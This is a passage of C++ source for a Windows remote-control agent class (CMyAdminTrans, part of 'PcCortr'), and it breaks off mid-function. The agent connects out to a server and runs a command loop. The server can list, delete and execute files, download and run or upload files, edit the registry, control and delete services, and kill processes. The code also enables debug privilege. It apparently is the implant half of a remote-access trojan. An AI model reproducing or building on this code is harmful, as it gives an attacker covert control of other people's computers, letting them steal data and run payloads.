// MyAdminTrans.cpp: implementation of the CMyAdminTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "PcCortr.h"
#include "zlib.h"
#include <sys/stat.h>
#include "MyAdminTrans.h"
#include ".\myadmintrans.h"
#include <Shellapi.h>

//#pragma comment(lib, "Shellapi.lib")

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyAdminTrans::CMyAdminTrans()
{
	m_Command = 0;				
	m_dTransLen = 0;	
	m_TransData = new char[T_DATALEN + 100];
}

CMyAdminTrans::~CMyAdminTrans()
{
	if(m_TransData != NULL)
		delete [] m_TransData;
}

BOOL CMyAdminTrans::StartWork(char* m_ServerAddr, int m_ServerPort, int nSend, int nRecv)
{
	//连接目标服务器,创建发送接收管道
	if(!CMyHttpPipeBase::StartWork(
		m_ServerAddr, m_ServerPort, nSend, nRecv)) 
		return FALSE;

	//开始任务
	while(1)
	{
		//接收命令
		if(!ReadBag(m_TransData,m_dTransLen,m_Command))
			break;

		//处理为字串
		m_TransData[m_dTransLen] = 0;

		//命令处理
		switch(m_Command)
		{
			//列举服务
			case CLIENT_ENUM_SERVICES :
				EnumMyServices(m_TransData,m_dTransLen,m_Command);
				break;

			//更新服务
			case CLIENT_CONFIG_SERVICES :
				ConfigMyServices(m_TransData,m_dTransLen,m_Command);
				break;

			//控制服务
			case CLIENT_CONTROL_SERVICES :
				ControlMyServices(m_TransData,m_dTransLen,m_Command);
				break;

			//取注册表子键值
			case CLIENT_REG_QUERY :
				MyRegEnumKey(m_TransData,m_dTransLen,m_Command);
				break;

			//删除指定子键
			case CLIENT_REG_DELETE_KEY :
				MyRegDeleteKey(m_TransData,m_dTransLen,m_Command);
				break;

			//查找指定文件
			case CLIENT_FIND_FILE :
				GetFindFileList(m_TransData,m_dTransLen,m_Command);
				break;

			//更改键值名
			case CLIENT_REG_RENAME_VALUE :
				MyRegRenameValue(m_TransData,m_dTransLen,m_Command);
				break;

			//删除指定键值
			case CLIENT_REG_DELETE_VALUE :
				MyRegDeleteValue(m_TransData,m_dTransLen,m_Command);
				break;

			//新建键值
			case CLIENT_REG_CREATE_VALUE :
				MyRegCreateValue(m_TransData,m_dTransLen,m_Command);
				break;

			//更改键值
			case CLIENT_REG_EDIT_VALUE :
				MyRegEditValue(m_TransData,m_dTransLen,m_Command);
				break;

			//新建目录
			case CLIENT_CREATE_DIR :	
				CreateDir(m_TransData,m_dTransLen,m_Command);
				break;
			
			//显示目录内容
			case CLIENT_DIR_LIST :	
				GetDirList(m_TransData,m_dTransLen,m_Command);
				break;

			//取磁盘列表
				case CLIENT_DISK_LIST :	
				GetDiskList(m_TransData,m_dTransLen,m_Command);
				break;

			//目录信息
			case CLIENT_DIR_INFO	:	
				GetDirInfo(m_TransData,m_dTransLen,m_Command);
				break;

			//文件信息
			case CLIENT_FILE_INFO	:	
				GetFileInfo(m_TransData,m_dTransLen,m_Command);
				break;

			//磁盘信息
			case CLIENT_DISK_INFO	:	
				GetDiskInfo(m_TransData,m_dTransLen,m_Command);
				break;

			//更名
			case CLIENT_RENAME		:	
				ReNameFile(m_TransData,m_dTransLen,m_Command);
				break;

			//删除文件
			case CLIENT_FILE_DELETE	:	
				DeleteMyFile(m_TransData,m_dTransLen,m_Command);
				break;

			//运行文件
			case CLIENT_EXEC_FILE	:	
				ExecFile(m_TransData,m_dTransLen,m_Command);
				break;

			//杀进程
			case CLIENT_PROCESS_KILL:	
				KillOneProcess(m_TransData,m_dTransLen,m_Command);
				break;
			
			//列举进程
			case CLIENT_PROCESS_LIST :
				GetProcessList(m_TransData,m_dTransLen,m_Command);
				break;

			//取目录拷贝列表
			case CLIENT_COPY_DIR_LIST :
				GetCopyList(m_TransData,m_dTransLen,m_Command);
				break;

			//删除服务 
			case CLIENT_DELETE_SERVICE :
				DeleteMyServices(m_TransData,m_dTransLen,m_Command);
				break;

			//下载运行文件
			case CLIENT_DL_FILE :
				PutMyFile(m_TransData,m_dTransLen,m_Command,
					m_ServerAddr , m_ServerPort);
				break;

			//上传运行文件
			case CLIENT_UP_FILE :
				GetMyFile(m_TransData,m_dTransLen,m_Command,
					m_ServerAddr , m_ServerPort);
				break;

			default		:	
				m_dTransLen = 0; 
				m_Command = INVALID_COMMAND;
				break;
		}

		//发送数据
		if(!SendBag(m_TransData,m_dTransLen,m_Command))
			break;
	}

	if(m_TransData != NULL)
	{
		delete [] m_TransData;
		m_TransData = NULL;
	}

	//关闭句柄
	StopWork();
	return TRUE;
}

BOOL CMyAdminTrans::ReadBag(char* Data, DWORD& Len,UINT &m_Command)
{
	//接收命令
	if(!RecvData((char*) &m_Command, sizeof(UINT)))
		return FALSE;

	//接收长度
	if(!RecvData((char*) &Len, sizeof(DWORD)))
		return FALSE;

	TRACE("ReadBag : Len = %d,m_Command = %d\n",Len,m_Command);

	//查看数据长度
	if(Len <= 0) return TRUE;

	//接收数据
	if(!RecvData(Data, Len)) return FALSE;

	return TRUE;
}

BOOL CMyAdminTrans::SendBag(char* Data, DWORD &Len,UINT &m_Command)
{
	//发送命令
	if(!SendData((char*) &m_Command, sizeof(UINT)))
		return FALSE;

	//发送长度
	if(!SendData((char*) &Len, sizeof(DWORD)))
		return FALSE;

	TRACE("SendBag : Len = %d,m_Command = %d\n",Len,m_Command);

	//查看数据长度
	if(Len <= 0) return TRUE;

	//发送数据
	if(!SendData(Data, Len)) return FALSE;

	return TRUE;
}

void CMyAdminTrans::DeleteMyFile(char * m_TransData,DWORD &len,UINT &m_Command)
{
	DIRLIST m_DirList = {0};
	for(DWORD i = 0; i < (len/sizeof(DIRLIST)); i++)
	{
		memcpy(&m_DirList,m_TransData + i * sizeof(DIRLIST),sizeof(DIRLIST));
		if(m_DirList.m_ItemName[strlen(m_DirList.m_ItemName) - 1] == '\\')
		{
			m_DirList.m_ItemName[strlen(m_DirList.m_ItemName) - 1] = 0;
		}
		FileOpertion(m_DirList.m_ItemName,"",FO_DELETE);
	}
	//TODO:暂且注释掉，by zyl
	//SHEmptyRecycleBin(NULL,NULL,SHERB_NOCONFIRMATION|SHERB_NOPROGRESSUI | SHERB_NOSOUND);
	m_Command = 0;
	len = 0;
}

void CMyAdminTrans::CreateDir(char * m_TransData,DWORD &len,UINT &m_Command)
{
	if(!CreateDirectory(m_TransData,NULL))
		m_Command = CREATE_DIR_FAILE;
	else
		m_Command = 0;
	len = 0;
}

void CMyAdminTrans::ReNameFile(char * m_TransData,DWORD &len,UINT &m_Command)
{
	len = 0;
	char m_NewName[256] = {0};
	char m_OldName[256] = {0};
	char * m_Data = m_TransData;

	//新文件名
	char *p = strchr(m_Data,'*');
	if(p == NULL)
	{
		m_Command = COMMAND_PARAM_ERR;
		return;
	}
	*p = 0;
	strcpy(m_NewName,m_Data);

	//旧文件名
	strcpy(m_OldName,p + 1);

	//更名
	if(!MoveFile(m_OldName,m_NewName))
	{
		m_Command = RENAME_FAILE;
		return;
	}
	m_Command = 0;
}

void CMyAdminTrans::GetFindFileList(char * m_TransData,DWORD &len,UINT &m_Command)
{
	if(m_TransData[len-1] == '\\') m_TransData[len-1] = 0;

	char m_FileName[256] = {0};
	char *p = strrchr(m_TransData,'\\');
	*p = 0;
	strcpy(m_FileName,p + 1);

	char m_TmpFileName[512] = {0};
	GetTempPath(500,m_TmpFileName);
	strcat(m_TmpFileName,"MyTmpFile.Dat");	
	CFile m_File;
	m_File.Open(m_TmpFileName,CFile::modeCreate|CFile::modeReadWrite);
	if(!FindFile(m_TransData,m_FileName,&m_File))
	{
		m_File.Close();
		m_Command = NOT_FIND_ANY_FILE;
		return;
	}
	MakeCompressData(m_TransData,len,m_Command,&m_File);
}

void CMyAdminTrans::GetDiskList(char * m_TransData,DWORD &len,UINT &m_Command)
{
	char m_SmallBuf[512];	
	memset(m_SmallBuf,0,sizeof(m_SmallBuf));
	DWORD  m_len = GetLogicalDriveStrings (26 * 4,m_SmallBuf);
	char *p = m_TransData;

	LPDIRFILELIST pItem = (LPDIRFILELIST) m_TransData;
	for(DWORD i = 0; i < m_len; i += 4)
	{
		memset(pItem,0,sizeof(DIRFILELIST));
		sprintf(pItem->m_ItemPath,"root\\%s",&m_SmallBuf[i]);
		_strupr(pItem->m_ItemPath);
		pItem->m_ItemPath[7] = 0;
		pItem->m_ItemType = GetDriveType(&m_SmallBuf[i]);
		if(pItem->m_ItemPath[5] == 'A' ||
			pItem->m_ItemPath[5] == 'B')
		{
			strcpy(pItem->m_ItemSize,"0 MB");
			strcpy(pItem->m_ModifyTime,"0 MB");
		}
		else
		{
			ULARGE_INTEGER m_Size[3] = {0};
			if(GetDiskFreeSpaceEx(&m_SmallBuf[i],&m_Size[0],
							&m_Size[1],&m_Size[2]))
			{
				sprintf(pItem->m_ItemSize,"%d MB",
					(m_Size[1].QuadPart/(1024*1024)));
				sprintf(pItem->m_ModifyTime,"%d MB",
					(m_Size[2].QuadPart/(1024*1024)));
			}
			else
			{
				strcpy(pItem->m_ItemSize,"0 MB");
				strcpy(pItem->m_ModifyTime,"0 MB");
			}
		}
		pItem++;
	}
	len = m_len/4 * sizeof(DIRFILELIST);
	m_Command = 0;
	MakeCompressData(m_TransData,len);
}

void CMyAdminTrans::GetDirList(char * m_TransData ,DWORD &len,UINT &m_Command)
{
	CFileFind	m_DirListFind;
	char		m_DirFindName[512] = {0};
	DIRFILELIST m_DirFileList = {0};
	m_TransData[len] = 0;
	if(m_TransData[len-1] == '\\') m_TransData[len-1] = 0;

	char m_TmpFileName[512] = {0};
	GetTempPath(500,m_TmpFileName);
	strcat(m_TmpFileName,"MyTmpFile.Dat");	
	CFile m_File;
	if(!m_File.Open(m_TmpFileName,
		CFile::modeCreate|CFile::modeReadWrite))
	{
		len = 0;
		m_Command = CAN_NOT_OPEN_OBJECE;
		return;
	}
	sprintf(m_DirFindName,"%s\\*.*",m_TransData);
	if(!m_DirListFind.FindFile(m_DirFindName))
	{
		m_DirListFind.Close();
		m_File.Close();
		len = 0;
		m_Command = CAN_NOT_OPEN_OBJECE;
		return;
	}
	while(1)
	{
		if(m_DirListFind.FindNextFile())
		{
			if(!m_DirListFind.IsDots())
			{
				if(m_DirListFind.IsDirectory())
					m_DirFileList.m_ItemType = 7;
				else
					m_DirFileList.m_ItemType = 8;
				strcpy(m_DirFileList.m_ItemPath,m_DirListFind.GetFilePath());
				if(m_DirListFind.GetLength() > 1024)
					sprintf(m_DirFileList.m_ItemSize,"%ld KB",
							m_DirListFind.GetLength()/1024);
				else	
					sprintf(m_DirFileList.m_ItemSize,"%ld 字节",
							m_DirListFind.GetLength());
				CTime t;
				m_DirListFind.GetLastWriteTime(t);
				strcpy(m_DirFileList.m_ModifyTime,
					(LPCTSTR) t.Format("%Y-%m-%d %H:%M"));
				m_File.Write(&m_DirFileList,sizeof(DIRFILELIST));
			}
		}
		else
		{
			if(!m_DirListFind.IsDots())
			{
				if(m_DirListFind.IsDirectory())
					m_DirFileList.m_ItemType = 7;
				else
					m_DirFileList.m_ItemType = 8;
				strcpy(m_DirFileList.m_ItemPath,m_DirListFind.GetFilePath());
				if(m_DirListFind.GetLength() > 1024)
					sprintf(m_DirFileList.m_ItemSize,"%ld KB",
							m_DirListFind.GetLength()/1024);
				else	
					sprintf(m_DirFileList.m_ItemSize,"%ld 字节",
							m_DirListFind.GetLength());
				CTime t;
				m_DirListFind.GetLastWriteTime(t);
				strcpy(m_DirFileList.m_ModifyTime,
					(LPCTSTR) t.Format("%Y-%m-%d %H:%M"));
				m_File.Write(&m_DirFileList,sizeof(DIRFILELIST));
			}
			break;
		}
	}
	m_DirListFind.Close();
	MakeCompressData(m_TransData,len,m_Command,&m_File);
}

void CMyAdminTrans::GetFileInfo(char * m_TransData,DWORD &len,UINT &m_Command)
{
	CFileStatus		m_FileStatus;
	m_TransData[len] = 0;
	if(!CFile::GetStatus(m_TransData,m_FileStatus))
	{
		len = 0;
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	memcpy(m_TransData,&m_FileStatus,sizeof(CFileStatus));
	len = sizeof(CFileStatus);
	m_Command = 0;
	MakeCompressData(m_TransData,len);
}

void CMyAdminTrans::GetDirInfo(char * m_TransData,DWORD &len,UINT &m_Command)
{
	m_TransData[len] = 0;
	DIRINFO m_DirInfo;
	m_DirInfo.m_AllFileSize = 0;
	m_DirInfo.m_DirCount = 0;
	m_DirInfo.m_FileCount = 0;
	if(m_TransData[len - 1] == '\\')
	{
		m_TransData[len - 1] = 0;
	}
	if(!CFile::GetStatus(m_TransData,m_DirInfo.m_FileStatus))
	{
		len = 0;
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	if(!FindDir(m_TransData,m_DirInfo.m_DirCount,
		m_DirInfo.m_FileCount,m_DirInfo.m_AllFileSize))
	{
		len = 0;
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	len = sizeof(DIRINFO);
	memcpy(m_TransData,&m_DirInfo,len);
	m_Command = 0;
	MakeCompressData(m_TransData,len);
}

//取绝对进程号
typedef DWORD (WINAPI * GETMODULEFILENAMEEX) (HANDLE , HMODULE  ,  LPTSTR , DWORD );
void CMyAdminTrans::GetMoudleMame(DWORD pId, char* pExeName)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|
								PROCESS_VM_READ, FALSE, pId );
    if (NULL == hProcess) return;
	HMODULE hMoudle = LoadLibrary("psapi.dll");
	if(hMoudle == NULL) return;

	GETMODULEFILENAMEEX GetModuleFileNameEx = (GETMODULEFILENAMEEX) 
			GetProcAddress(hMoudle,"GetModuleFileNameExA");
	if(GetModuleFileNameEx != NULL)
	{
		char m_ExeName[1024] = {0};
		DWORD ret = GetModuleFileNameEx(hProcess, NULL, m_ExeName,1024);
		if(ret > 0)	strcpy(pExeName, m_ExeName);
	}
	FreeLibrary(hMoudle);
    CloseHandle(hProcess );
}

void CMyAdminTrans::GetProcessList(char * m_TransData,DWORD &len,UINT &m_Command)
{
	HANDLE m_Sys = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(m_Sys == NULL)
	{
		len = 0;
		m_Command = GET_PROCESS_LIST_ERR;
		return;
	}

	PROCESSENTRY32 m_Lppe = {0};
	m_Lppe.dwSize = sizeof(PROCESSENTRY32);
	if(!Process32First(m_Sys,&m_Lppe))
	{
		len = 0;
		m_Command = GET_PROCESS_LIST_ERR;
		CloseHandle(m_Sys);
		return;
	}
	
	// 给枚举的进程增加SE_DEBUG_NAME权限即可：
	HANDLE hToken;              // handle to process token 
	TOKEN_PRIVILEGES tkp;       // pointer to token structure 
	OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); 
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, 
	&tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 
		0, (PTOKEN_PRIVILEGES) NULL, 0); 
 
	char m_TmpFileName[512] = {0};
	GetTempPath(500,m_TmpFileName);
	strcat(m_TmpFileName,"MyTmpFile.Dat");	
	CFile m_File;
	if(!m_File.Open(m_TmpFileName,CFile::modeCreate|CFile::modeReadWrite))
	{
		len = 0;
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}
	PROCESSLIST m_ProcessList = {0};
	m_ProcessList.cntThreads = m_Lppe.cntThreads;
	m_ProcessList.pcPriClassBase = m_Lppe.pcPriClassBase;
	m_ProcessList.th32ProcessID = m_Lppe.th32ProcessID;
	strcpy(m_ProcessList.szExeFile,m_Lppe.szExeFile);
	if(strrchr(m_ProcessList.szExeFile, '\\') == NULL)
		GetMoudleMame(m_ProcessList.th32ProcessID, m_ProcessList.szExeFile);
	m_File.Write(&m_ProcessList,sizeof(PROCESSLIST));
	while(Process32Next(m_Sys,&m_Lppe))
	{
		memset(&m_ProcessList, 0, sizeof(PROCESSLIST));
		m_ProcessList.cntThreads = m_Lppe.cntThreads;
		m_ProcessList.pcPriClassBase = m_Lppe.pcPriClassBase;
		m_ProcessList.th32ProcessID = m_Lppe.th32ProcessID;
		strcpy(m_ProcessList.szExeFile,m_Lppe.szExeFile);
		if(strrchr(m_ProcessList.szExeFile, '\\') == NULL)
			GetMoudleMame(m_ProcessList.th32ProcessID, m_ProcessList.szExeFile);
		m_File.Write(&m_ProcessList,sizeof(PROCESSLIST));
	}
	CloseHandle(m_Sys);
	MakeCompressData(m_TransData,len,m_Command,&m_File);
}

void CMyAdminTrans::ConfigMyServices(char * m_TransData,DWORD &len,UINT &m_Command)
{
	SC_HANDLE hMana = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|
		GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		len = 0;
		m_Command = CONFIG_SERVICES_FAIL;
		return;
	}
	LPMYSERVICES pServices = (LPMYSERVICES) m_TransData;
	SC_HANDLE hServices = OpenService(hMana,
		pServices->m_Name,SERVICE_ALL_ACCESS);
	if(hServices == NULL)
	{
		CloseServiceHandle(hMana);
		len = 0;
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}
	if(!ChangeServiceConfig(hServices,SERVICE_NO_CHANGE,
		pServices->dwStartType,SERVICE_NO_CHANGE ,
		NULL,NULL,NULL,NULL,
		NULL,NULL,
		pServices->m_Disp))
	{
		CloseServiceHandle(hServices);
		CloseServiceHandle(hMana);
		len = 0;
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}
	len = 0;
	m_Command = 0;
	CloseServiceHandle(hServices);
	CloseServiceHandle(hMana);
}

void CMyAdminTrans::ControlMyServices(char * m_TransData,DWORD &len,UINT &m_Command)
{
	SC_HANDLE hMana = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|
		GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		len = 0;
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}

	SC_HANDLE hServices = OpenService(hMana,
		m_TransData + 1,SERVICE_ALL_ACCESS);
	if(hServices == NULL)
	{
		CloseServiceHandle(hMana);
		len = 0;
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}

	m_TransData[len] = 0;
	BOOL ret = FALSE;
	SERVICE_STATUS m_Status = {0};
	switch(m_TransData[0])
	{
		case 0	: ret = StartService(hServices,NULL,0);break;
		case 1	: ret = ControlService(hServices,SERVICE_CONTROL_STOP,&m_Status);break;
		default	: break;
	}
	len = 0;
	if(ret)
		m_Command = 0;
	else
		m_Command = CONTROL_SERVICES_FAIL;
	CloseServiceHandle(hServices);
	CloseServiceHandle(hMana);
}

void CMyAdminTrans::DeleteMyServices(char * m_TransData,DWORD &len,UINT &m_Command)
{
	SC_HANDLE hMana = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|
		GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		len = 0;
		m_Command = SERVICE_DELETE_ERR;
		return;
	}

	SC_HANDLE hServices = OpenService(hMana,
		m_TransData,SERVICE_ALL_ACCESS);
	if(hServices == NULL)
	{
		CloseServiceHandle(hMana);
		len = 0;
		m_Command = SERVICE_DELETE_ERR;
		return;
	}
	BOOL ret = DeleteService(hServices);
	CloseServiceHandle(hServices);
	CloseServiceHandle(hMana);
	len = 0;
	if(ret) 
		m_Command = 0;
	else
		m_Command = SERVICE_DELETE_ERR;
}

void CMyAdminTrans::EnumMyServices(char * m_TransData,DWORD &len,UINT &m_Command)
{
	SC_HANDLE hMana = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|
		GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		len = 0;
		m_Command = ENUM_SERVICES_FAIL;
		return;
	}

	DWORD m_ByteNeed = 0;
	DWORD m_Count = 0;
	DWORD NextEntry = 0;
	BYTE *m_TmpBuf = new BYTE[102400];
	if(!EnumServicesStatus(hMana,SERVICE_WIN32,
		SERVICE_STATE_ALL,(LPENUM_SERVICE_STATUS) m_TmpBuf,
		102400,&m_ByteNeed,&m_Count,&NextEntry))
	{
		delete [] m_TmpBuf;
		CloseServiceHandle(hMana);
		len = 0;
		m_Command = ENUM_SERVICES_FAIL;
		return;
	}

	char m_TmpFileName[512] = {0};
	GetTempPath(500,m_TmpFileName);
	strcat(m_TmpFileName,"MyTmpFile.Dat");	
	CFile m_File;
	if(!m_File.Open(m_TmpFileName,CFile::modeCreate|CFile::modeReadWrite))
	{
		delete [] m_TmpBuf;
		len = 0;
		m_Command = CAN_NOT_OPEN_OBJECE;
		return;
	}

	MYSERVICES m_Services = {0};
	LPENUM_SERVICE_STATUS pStauts = (LPENUM_SERVICE_STATUS) m_TmpBuf;
	for(DWORD i = 0; i < m_Count; i++)
	{
		memset(&m_Services,0,sizeof(MYSERVICES));
		strcpy(m_Services.m_Name,pStauts[i].lpServiceName);
		strcpy(m_Services.m_Disp,pStauts[i].lpDisplayName);
		*((DWORD*) m_Services.m_Status) = 
			 pStauts[i].ServiceStatus.dwCurrentState;
		GetServicesConfig(hMana,&m_Services);
		m_File.Write(&m_Services,sizeof(MYSERVICES));
	}
	delete [] m_TmpBuf;
	CloseServiceHandle(hMana);
	MakeCompressData(m_TransData,len,m_Command,&m_File);
}

void CMyAdminTrans::KillOneProcess(char * m_TransData,DWORD &len,UINT &m_Command)
{
	DWORD m_ProcessId = 0;
	m_ProcessId = *((DWORD*) m_TransData);
	HANDLE m_Kill = OpenProcess(PROCESS_TERMINATE,FALSE,m_ProcessId);
	if(m_Kill == NULL)
	{
		//终止进程失败
		m_Command = KILL_PROCESS_ERR;
		len = 0;
		return;
	}
	if(!TerminateProcess(m_Kill,0))
	{
		//终止进程失败
		m_Command = KILL_PROCESS_ERR;
		len = 0;
		CloseHandle(m_Kill);
		return;
	}
	CloseHandle(m_Kill);
	m_Command = 0;
	len = 0;
}

void CMyAdminTrans::ExecFile(char * m_TransData,DWORD &len,UINT &m_Command)
{
	if(!ShellExecute(NULL,NULL,	m_TransData,NULL,NULL,SW_SHOW))
		m_Command = EXEC_FILE_FAIL;
	else
		m_Command = 0;
	len = 0;
}

void CMyAdminTrans::GetDiskInfo(char * m_TransData,DWORD &len,UINT &m_Command)
{
	m_TransData[len] = 0;
	if(strlen(m_TransData) > 3)
	{
		//非法驱动器
		len = 0;
		m_Command = GET_DISK_INFO_FAIL;
		return;
	}
	if(m_TransData[len - 1] == '\\')
	{
		m_TransData[len - 1] = 0;
	}
	DISKINFO m_DiskInfo = {0};
	strcpy(m_DiskInfo.m_Name,m_TransData);
	if(!GetDiskFreeSpaceEx(m_TransData,(ULARGE_INTEGER*) 
		&(m_DiskInfo.FreeBytesAvailable),
		(ULARGE_INTEGER*) &(m_DiskInfo.TotalNumberOfBytes),
		(ULARGE_INTEGER*) &(m_DiskInfo.TotalNumberOfFreeBytes)))
	{
		m_DiskInfo.TotalNumberOfBytes = 0;
		m_DiskInfo.FreeBytesAvailable = 0;
		m_DiskInfo.TotalNumberOfFreeBytes = 0;
	}
	DWORD MaximumComponentLength = 0;
	DWORD FileSystemFlags = 0;
	strcat(m_TransData,"\\");
	GetVolumeInformation(m_TransData,
		m_DiskInfo.m_Volume,128,NULL,&MaximumComponentLength,
			&FileSystemFlags,m_DiskInfo.m_FileSys,128);
	m_DiskInfo.m_DeviceType = GetDriveType(m_TransData);
	len = sizeof(DISKINFO);
	memcpy(m_TransData,&m_DiskInfo,len);
	m_Command = 0;
	MakeCompressData(m_TransData,len);
}

BOOL CMyAdminTrans::MyGetKeyStr(LPCTSTR Title,LPCTSTR KeyName, char* KeyValue)
{
	HKEY m_key = NULL;
	long ret = RegOpenKeyEx (	HKEY_LOCAL_MACHINE,
								Title,
								0,
								KEY_ALL_ACCESS,
								&m_key
							 );
	if(ret != ERROR_SUCCESS)
	{
		return FALSE;
	}

	char m_KeyValue[8192];
	memset(m_KeyValue,0,sizeof(m_KeyValue));
	DWORD len = 8191;
	DWORD m_Type = REG_SZ;
	ret = RegQueryValueEx(	m_key,
							KeyName,
							0,
							&m_Type,
							(BYTE *)m_KeyValue,
							&len
						);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		return FALSE;
	}
	strcpy(KeyValue,m_KeyValue);
	ret = RegCloseKey(m_key);
	if(ret != ERROR_SUCCESS)
	{
		return FALSE;
	}
	return TRUE;
}

HKEY CMyAdminTrans::GetBootKey(char *KeyName)
{
	HKEY m_Rootkey = NULL;
	if(!memcmp(KeyName,"HKEY_CLASSES_ROOT",17))
	{
		m_Rootkey = HKEY_CLASSES_ROOT;
	}
	else if(!memcmp(KeyName,"HKEY_CURRENT_CONFIG",19))
	{
		m_Rootkey = HKEY_CURRENT_CONFIG;
	}
	else if(!memcmp(KeyName,"HKEY_CURRENT_USER",17))
	{
		m_Rootkey = HKEY_CURRENT_USER ;
	}
	else if(!memcmp(KeyName,"HKEY_LOCAL_MACHINE",18))
	{
		m_Rootkey = HKEY_LOCAL_MACHINE ;
	}
	else if(!memcmp(KeyName,"HKEY_USERS",10))
	{
		m_Rootkey = HKEY_USERS ;
	}
	return m_Rootkey;
}

void CMyAdminTrans::MyRegEditValue(char * m_TransData,DWORD &len,UINT &m_Command)
{
	char m_NewKey[2048] = {0};
	char m_KeyValue[2048] = {0};

	memcpy(m_NewKey,m_TransData,1024);
	memcpy(m_KeyValue,&m_TransData[1024],1024);
	int m_IsDigital = m_TransData[2048];
	DWORD m_DataLen = m_TransData[2049];
	
	char * pDataStart = strchr(m_NewKey,'\\');
	if(pDataStart == NULL)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}
	*pDataStart = 0;
	pDataStart++;

	HKEY m_Rootkey = GetBootKey(m_NewKey);
	HKEY m_key = NULL;
	DWORD m_Res = 0;

	char m_NewName[1024] = {0};
	char *pName = strrchr(pDataStart,'\\');
	if(pName != NULL)
	{
		*pName = 0;
		pName++;
		strcpy(m_NewName,pName);
	}
	else
	{
		strcpy(m_NewName,pDataStart);
		pDataStart[0] = 0;
	}

	long ret = RegOpenKeyEx (m_Rootkey,pDataStart,
					0,KEY_ALL_ACCESS,&m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}

	if(!strcmp(m_NewName ,"(默认)"))
	{
		m_NewName[0] = 0;
	}

	DWORD m_Type = REG_DWORD;
	DWORD DataLen = sizeof(DWORD);
	DWORD m_Value = 0;
	if(m_IsDigital == REG_VALUE_INT)
	{
		m_Type = REG_DWORD;
		DataLen = sizeof(DWORD);
		m_Value = atol(m_KeyValue);
		memset(m_KeyValue,0,sizeof(m_KeyValue));
		memcpy(m_KeyValue,&m_Value,sizeof(DWORD));
	}
	else if(m_IsDigital == REG_VALUE_STR)
	{
		m_Type = REG_SZ;
		DataLen = strlen(m_KeyValue) + 1;
	}
	else
	{
		m_Type = REG_BINARY;
		DataLen = m_DataLen;
	}
	
	ret = RegSetValueEx(	m_key,
							m_NewName,
							0,
							m_Type,
							(CONST BYTE *) m_KeyValue,
							DataLen
						);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		m_Command = REG_EDIT_VALUE_ERR;
		len = 0;
		return;
	}

	RegCloseKey(m_key);
	m_Command = 0;
	len = 0;
	return;
}

void CMyAdminTrans::MyRegCreateValue(char * m_TransData,DWORD &len,UINT &m_Command)
{
	char m_NewName[512] = {0};
	char m_NewKey[2048] = {0};
	memcpy(m_NewKey,m_TransData,1024);
	int m_IsSz = m_TransData[1024];
	strcpy(m_NewName, &m_TransData[1025]);
	char * pDataStart = strchr(m_NewKey,'\\');
	if(pDataStart == NULL)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}
	*pDataStart = 0;
	pDataStart++;

	HKEY m_Rootkey = GetBootKey(m_NewKey);
	DWORD m_Type = 0;
	char m_KeyValue[20] = {0};
	DWORD DataLen = 0;
	if(m_IsSz == REG_VALUE_INT)
	{
		m_Type = REG_DWORD;
		DataLen = sizeof(DWORD);
	}
	else if(m_IsSz == REG_VALUE_BIN)
	{
		m_Type = REG_BINARY;
		DataLen = 1;
	}
	else
	{
		m_Type = REG_SZ;
		strcpy(m_KeyValue,"");
		DataLen = 1;
	}

	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = RegOpenKeyEx (m_Rootkey,pDataStart,
					0,KEY_ALL_ACCESS,&m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}

	ret = RegSetValueEx(	m_key,
							m_NewName,
							0,
							m_Type,
							(CONST BYTE *)m_KeyValue,
							DataLen
						);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		m_Command = REG_CREATE_VALUE_ERR;
		len = 0;
		return;
	}

	RegCloseKey(m_key);
	m_Command = 0;
	len = 0;
	return;
}

void CMyAdminTrans::MyRegRenameValue(char * m_TransData,DWORD &len,UINT &m_Command)
{
	char m_NewKey[2048] = {0};
	char m_OldKey[2048] = {0};

	memcpy(m_NewKey,m_TransData,1024);
	memcpy(m_OldKey,&m_TransData[1024],1024);

	char * pDataStart = strchr(m_NewKey,'\\');
	if(pDataStart == NULL)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}
	*pDataStart = 0;
	pDataStart++;

	char * pOldDataStart = strchr(m_OldKey,'\\');
	if(pOldDataStart == NULL)
	{
